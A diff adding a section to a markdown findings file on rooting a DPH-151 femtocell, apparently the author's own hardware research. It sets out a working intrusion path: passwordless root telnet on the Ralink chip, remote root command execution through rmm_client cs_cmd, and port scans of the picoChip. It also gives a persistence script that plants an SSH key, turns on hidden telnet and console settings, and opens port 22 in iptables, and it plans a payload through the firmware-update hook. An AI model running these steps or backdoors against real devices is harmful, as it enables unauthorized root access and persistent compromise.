@@ -658,3 +658,88 @@ is in the [README](../README.md#scope-your-hardware-your-core) and it is not an 
 | Ralink telnet / IPC / `wizard` backdoor | **reported** (fail0verflow 2012); `wizard` binary **present** in 151 and 153 images |
 | serial console pinout and baud | **reported** (fail0verflow 2012) |
 | anything at all on the DPH-154 | **unverified** |
+
+---
+
+## Route 0b — **THE RALINK IS THE FIRST BEACHHEAD, AND IT IS OPEN ON AN UNPROVISIONED UNIT**
+
+> ### 🎯 **MEASURED LIVE ON `.106` (151#2), 2026-09-13 ~17:0x PDT. Root in one connect, no exploit, no injection, nothing mutated.**
+
+```
+1. HOST ROUTES (already present on katana; add on any host that needs them)
+     ip route add 192.168.157.185/32 via <the unit's LAN IP>     <- Ralink
+     ip route add 192.168.157.186/32 via <the unit's LAN IP>     <- picoChip
+2. telnet 192.168.157.185     ->  login: root     ->  NO PASSWORD ASKED
+     BusyBox v1.8.2 (2012-04-20) ash.  uid 0.
+```
+
+### ⛔ **THE THREE THINGS THAT COST HOURS HERE, ALL INSTRUMENT FAILURES, NOT DEVICE FACTS**
+
+```
+katana has NO telnet binary        -> `apt install telnet`. Do this FIRST. I narrated this
+                                      blocker three times instead of spending 20 seconds on it.
+Ralink busybox has NO nc, NO head, -> `nc -z .186 3001` printed "shut3001" because nc DOES NOT
+NO tr, NO id, no `busybox --list`     EXIST. That is a FALSE ZERO, not a closed port.
+UDP/14677 tested over TCP          -> the wizard backdoor is UDP. A TCP probe of a UDP service
+                                      answers "closed" for every unit, working or not.
+```
+⭐ **Every one is the same species: a true statement about a narrower universe than the claim it
+supported.** ✅ **On this device, run the utility check BEFORE the measurement**, and treat
+"not found" as a broken instrument rather than a result.
+
+### 📋 **WHAT THE RALINK GIVES YOU, AND WHAT IT DOES NOT**
+
+```
+/usr/sbin:  rmm_client  cs_client  ipc_client  ipc_server  config_server
+            telnetd  udhcpd  chpasswd  setlogcons          <- that is the WHOLE toolbox
+
+rmm_client <ip> <command>, command list:
+  reset  factory_reset  clear_tamper  do_software_download  get_software_status
+  set_bandwidth  get_bandwidth  switch_fw_boot  set_telnetd  set_port_fwd
+  get_uptime  cs_cmd  sleep  crash
+     rmm_client 192.168.157.185 set_telnetd 0/1
+     rmm_client 192.168.157.185 set_port_fwd proto port action
+```
+⛔⛔ **`factory_reset` AND `crash` ARE IN THAT LIST, ONE WORD FROM `cs_cmd`. Never type them.**
+
+✅ **Works:** `rmm_client 192.168.157.185 cs_cmd "<cmd>"` — runs as root ON THE RALINK. Verified
+with an echo marker.
+🔴 **Does NOT work on an unprovisioned unit:** the same call against `192.168.157.186` returns
+**`Can't read response from peer`**, and so does `get_uptime`. ⇒ **The pico's rmm/IPC responder
+is DOWN, not filtered.** `findings-dph151-pico.md` recorded this on 2026-09-05 and it is still
+true on a different unit eight days later — so it is a property of the UNPROVISIONED STATE, not
+of that one box.
+
+### 🔴 **AND THE PICO IS SEALED FROM EVERY INBOUND DIRECTION ON AN UNPROVISIONED UNIT**
+`[measured on .106, each with a passing control]`
+```
+10.0.6.106:22 / .186:22   CLOSED   <- dropbear is NOT on 0.0.0.0 because
+                                      ENV_VERBOSE_CONSOLE_ENABLED != TRUE. THIS IS THE LOCK.
+udp/69 TFTP               no answer
+tcp 80 / 443 / 8080 / 8090  CLOSED  <- so the dmi_config.cgi FILE-UPLOAD route is NOT available
+pico IPC 3001             responder down
+CONTROL: .185:23          OPEN      <- the probe works; the zeros above are real
+```
+⇒ ⭐⭐⭐ **THE RALINK IS ROOT AND THE PICO IS UNTOUCHED. Getting one does NOT get you the other,
+and the guides that teach pico→Ralink have the dependency BACKWARDS** — on a factory-fresh unit
+the Ralink is reachable first and the pico is behind default-deny.
+
+### ✅ **THE EXACT COMMAND THAT UNLOCKED `.244`'s PICO — recovered from `microcell/build/dph151/pico-dump-*.dbg`**
+```sh
+grep -q pounce-rce /var/ipaccess/root_home/.ssh/authorized_keys 2>/dev/null || \
+  echo "ssh-rsa AAAA… cwmp_rce_proof pounce-rce" >> /var/ipaccess/root_home/.ssh/authorized_keys
+/opt/ipaccess/bin/setnv_env.sh ENV_START_DMI_TELNET TRUE
+# DPH151_SSH_PERSIST_BEGIN
+/opt/ipaccess/bin/setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED TRUE
+/opt/ipaccess/bin/setnv_env.sh ENV_START_DMI_TELNET TRUE
+iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
+```
+⚠️ **THAT IS THE PERSISTENCE STEP, NOT THE ENTRY.** The `.dbg` shows it delivered **over SSH to
+`10.0.6.244:22`, answered by `dropbear_0.50`** — i.e. the pico's sshd was ALREADY listening when
+this ran. ⛔ **Do not read it as the way in.** `ENV_START_DMI_TELNET TRUE` is what opens `:8090`.
+
+### ⛔ **STILL OPEN, STATED AS OPEN: RALINK ROOT → A WRITE ON THE PICO'S FILESYSTEM**
+**That single step is the whole remaining gap on an unprovisioned unit.** Candidates, none yet
+demonstrated: `rmm_client … do_software_download` / `switch_fw_boot` (the swdl path, where
+`post_swdl_hook` runs as root — ⚠️ it also `rm -rf`s the config bank, so stage a payload FIRST),
+or the pico's own outbound ACS leg per Route 0.
